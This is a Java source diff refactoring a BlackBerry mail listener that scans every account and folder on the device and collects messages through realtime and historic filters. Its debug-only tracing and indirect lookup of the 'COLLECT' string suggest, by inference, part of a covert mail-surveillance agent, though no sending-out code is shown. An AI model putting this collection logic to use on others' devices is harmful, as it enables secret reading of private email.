@@ -46,7 +46,8 @@ import blackberry.module.ModuleMessage;
  * 
  * @author user1
  */
-public final class MailListener implements FolderListener, SendListener, iSingleton { //, StoreListener, SendListener {
+public final class MailListener implements FolderListener, SendListener,
+        iSingleton { //, StoreListener, SendListener {
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
@@ -57,8 +58,8 @@ public final class MailListener implements FolderListener, SendListener, iSingle
 
     protected static IntHashtable fieldTable;
     private static ServiceRecord[] mailServiceRecords;
-    private Filter realtimeFilter;
-    private Filter collectFilter;
+    //private Filter realtimeFilter;
+    //private Filter collectFilter;
 
     //Vector mailObservers = new Vector();
     MailObserver mailObserver;
@@ -98,13 +99,12 @@ public final class MailListener implements FolderListener, SendListener, iSingle
         debug.trace("Starting: " + mailServiceRecords.length + " accounts");
         //#endif
 
-        // to forever
-        realtimeFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance())
-                .getFilterEmailRealtime();
-
-        // history
-        collectFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance())
-                .getFilterEmailCollect();
+        /*
+         * // to forever realtimeFilter = (Filter) ((ModuleMessage)
+         * ModuleMessage.getInstance()) .getFilterEmailRealtime(); // history
+         * collectFilter = (Filter) ((ModuleMessage)
+         * ModuleMessage.getInstance()) .getFilterEmailCollect();
+         */
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -234,6 +234,9 @@ public final class MailListener implements FolderListener, SendListener, iSingle
                 return;
             }
 
+            Filter realtimeFilter = ModuleMessage.getInstance()
+                    .getFilterEmailRealtime();
+
             //long lastcheck = messageAgent.getLastCheck(folderName);
             // realtime non guarda il lastcheck, li prende tutti.
             final int filtered = realtimeFilter.filterMessage(message, 0);
@@ -251,10 +254,15 @@ public final class MailListener implements FolderListener, SendListener, iSingle
             }
 
             if (!collecting) {
-                ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
-                        "COLLECT", new Date());
-                ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
-                        folderName, new Date());
+                //C.1=COLLECT
+                /*
+                 * ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
+                 * Messages.getString("C.1"), new Date());
+                 */
+                //String parent = message.getFolder().getParent().getName();
+                //String folder = message.getFolder().getName();
+                String fullname = message.getFolder().getFullName();
+                ModuleMessage.getInstance().lastcheckSet(fullname, new Date());
             }
 
         } catch (final MessagingException ex) {
@@ -299,14 +307,11 @@ public final class MailListener implements FolderListener, SendListener, iSingle
         //store.removeStoreListener(this);
     }
 
-    //#ifdef HISTORY_MAIL
     boolean stopHistory;
 
     public void stopHistory() {
         stopHistory = true;
     }
-
-    //#endif
 
     /**
      * retrieveHistoricMails.
@@ -315,27 +320,32 @@ public final class MailListener implements FolderListener, SendListener, iSingle
         //final long timestamp = messageAgent.initMarkup();  
         //#ifdef DEBUG
         debug.init();
+
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("retrieveHistoricMails");
         //#endif
 
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
-        final Date lastCheckDate = ((ModuleMessage) ModuleMessage.getInstance())
-                .lastcheckGet("COLLECT");
+        // C.1=COLLECT
+        /*
+         * final Date lastCheckDate = ModuleMessage.getInstance().lastcheckGet(
+         * Messages.getString("C.1"));
+         */
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-            //#ifdef HISTORY_MAIL
             if (stopHistory) {
                 break;
             }
-            //#endif
             names[count] = mailServiceRecords[count].getName();
             //#ifdef DEBUG
             debug.trace("Email account name: " + names[count]);
             //#endif
 
-            Date lastCheckDateName = ((ModuleMessage) ModuleMessage
-                    .getInstance()).lastcheckGet(names[count]);
+            //Date lastCheckDateName = ModuleMessage.getInstance().lastcheckGet(names[count]);
 
             //names[count] = mailServiceRecords[0].getName();
             final ServiceConfiguration sc = new ServiceConfiguration(
@@ -344,16 +354,19 @@ public final class MailListener implements FolderListener, SendListener, iSingle
 
             final Folder[] folders = store.list();
             // Scandisco ogni Folder dell'account di posta
-            scanFolders(names[count], folders, lastCheckDateName);
+            scanFolders(names[count], folders);
+            ModuleMessage.getInstance().lastcheckSave();
 
-            ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
-                    names[count], new Date());
+            //ModuleMessage.getInstance().lastcheckSet(names[count], new Date());
         }
 
         //if (!stopHistory) {
         // al termine degli scanfolder
-        ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet("COLLECT",
-                new Date());
+        // C.1=COLLECT
+        /*
+         * ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
+         * Messages.getString("C.1"), new Date());
+         */
         //}
 
         //#ifdef DEBUG
@@ -361,9 +374,7 @@ public final class MailListener implements FolderListener, SendListener, iSingle
         //#endif
 
         collecting = false;
-        //#ifdef HISTORY_MAIL
         stopHistory = false;
-        //#endif
     }
 
     /**
@@ -373,35 +384,49 @@ public final class MailListener implements FolderListener, SendListener, iSingle
      * @param subfolders
      *            the subfolders
      */
-    public void scanFolders(final String storeName, final Folder[] subfolders,
-            Date lastCheckDate) {
+    public void scanFolders(final String storeName, final Folder[] subfolders) {
         Folder[] dirs;
+
+        Filter collectFilter = ModuleMessage.getInstance()
+                .getFilterEmailCollect();
 
         //#ifdef DBC
         Check.requires(subfolders != null && subfolders.length >= 0,
                 "scanFolders");
-        Check.requires(lastCheckDate != null, "scanFolders lastCheckDate null");
-        Check.requires(collectFilter != null, "collectFilter == null");
+        Check.requires(collectFilter != null,
+                "scanFolders, collectFilter == null");
         //#endif
 
         if (collectFilter == null) {
             //#ifdef DEBUG
-            debug.trace("no collectFilter, messageAgent: "
+            debug.trace("scanFolders, no collectFilter, messageAgent: "
                     + ModuleMessage.getInstance());
             //#endif
             if (ModuleMessage.getInstance() != null) {
-                //#ifdef DEBUG
-                debug.trace("new collectFilter");
-                //#endif
+
                 collectFilter = (Filter) ((ModuleMessage) ModuleMessage
                         .getInstance()).getFilterEmailCollect();
+                //#ifdef DEBUG
+                debug.trace("scanFolders, get collectFilter: " + collectFilter);
+                //#endif
             }
+        }
+
+        if (collectFilter == null) {
+            //#ifdef DEBUG
+            debug.error("scanFolders: null collectFilter");
+            //#endif
+            return;
         }
 
         for (int count = 0; count < subfolders.length; count++) {
 
             final Folder folder = subfolders[count];
             final String folderName = folder.getFullName();
+
+            Date lastCheckDate = ModuleMessage.getInstance().lastcheckGet(
+                    folderName);
+
             //#ifdef DEBUG
             debug.info("Folder name: " + folderName + " lastCheckDate:"
                     + lastCheckDate);
@@ -412,7 +437,7 @@ public final class MailListener implements FolderListener, SendListener, iSingle
             //#endif
             dirs = folder.list();
             if (dirs != null && dirs.length >= 0) {
-                scanFolders(storeName, dirs, lastCheckDate);
+                scanFolders(storeName, dirs);
             }
 
             try {
@@ -432,12 +457,9 @@ public final class MailListener implements FolderListener, SendListener, iSingle
 
                 // Scandisco ogni e-mail dell'account di posta
                 for (int j = messages.length - 1; j >= 0 && !next; j--) {
-
-                    //#ifdef HISTORY_MAIL
                     if (stopHistory) {
                         break;
                     }
-                    //#endif
 
                     try {
                         //#ifdef DEBUG
@@ -494,6 +516,12 @@ public final class MailListener implements FolderListener, SendListener, iSingle
                         debug.error("message # " + j + " ex:" + ex);
                         //#endif
                     }
+
+                }
+
+                if (updateMarker) {
+                    ModuleMessage.getInstance().lastcheckSet(folderName,
+                            new Date(), false);
                 }
 
             } catch (final MessagingException e) {
